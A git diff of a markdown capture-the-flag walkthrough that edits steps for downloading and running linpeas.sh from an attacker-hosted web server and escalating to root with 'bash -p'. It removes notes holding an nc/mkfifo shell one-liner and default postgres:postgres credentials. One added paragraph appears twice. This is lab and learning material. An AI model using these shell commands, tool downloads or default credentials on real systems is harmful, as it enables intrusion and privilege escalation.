@@ -700,6 +700,10 @@ You can download
 wget https://github.com/carlospolop/PEASS-ng/releases/download/20240223-ab2bb023/linpeas.sh
 ```
 
+New problem, It seems that we can't write to most directory.
+
+But we can write to the `/temp` directory. Now we can download the linpeas.
+
 To run Linpeas you can just do the following:
 ```bash
 ./linpeas.sh
@@ -723,11 +727,16 @@ file from the web server you are hosting.
 wget <OUR Attacker machine IP>/linpeas.sh
 ```  
 
+New problem, It seems that we can't write to most directory.
+
+But we can write to the `/temp` directory. Now we can download the linpeas.
+
 Now you can run linpeas with the following:
 
 ```bash
 ./linpeas.sh
 ```
+
 
 ### Manual Way
 
@@ -748,8 +757,9 @@ website https://gtfobins.github.io/
 Get the F**K out (GTFO) site is a site that have a list of programs that can
 give you a privilege escalation method.
 
+```bash
 bash -p
-
+```
 Now we should have root and we can this by using the `whoami` command.
 
 ![Whoami command](../../Assets/PwnToOwn/root.png)
@@ -773,11 +783,3 @@ submit the flag.
 
 GTFO https://gtfobins.github.io/
 
-HTTP Port 80
-Http 666
-nc -e Reverse shell or nc bind shell
-
-rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 4444 > /tmp/f
-5432 postresSQL
-user and password: postgres:postgres
-create lang module for metaspoilt
